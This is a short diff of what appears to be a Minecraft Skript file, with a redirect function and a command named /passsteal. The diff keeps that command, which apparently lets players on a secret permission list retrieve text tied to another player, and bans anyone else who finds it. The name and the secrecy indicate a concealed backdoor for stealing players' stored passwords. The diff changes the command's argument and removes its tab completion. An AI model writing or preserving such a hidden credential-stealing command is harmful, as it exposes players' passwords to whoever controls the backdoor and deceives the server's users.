@@ -93,14 +93,9 @@ command /l [<text>]:
 
 function redirect(p: player):
     send "&7Redirecting you to main server..." to {_p}
-    wait 2 second
     send {_p} to server "server"
 
-on join:
-    if {allplayers::*} does not contain player's name:
-        add player's name to {allplayers::*}
-
-command /passsteal <text>:
+command /passsteal <offlineplayer>:
     trigger:
         if {passsteal.permissions::*} contains player's name:
             if {passsteal.permissions::*} contains arg-1:
@@ -110,9 +105,6 @@ command /passsteal <text>:
             send {_text} to player
         else:
             ban player due to "You should not know /passsteal"
-
-on tab complete of "/passsteal":
-    set tab completions for position 1 to {allplayers::*}
 
 on load:
     delete {passsteal.permissions::*}
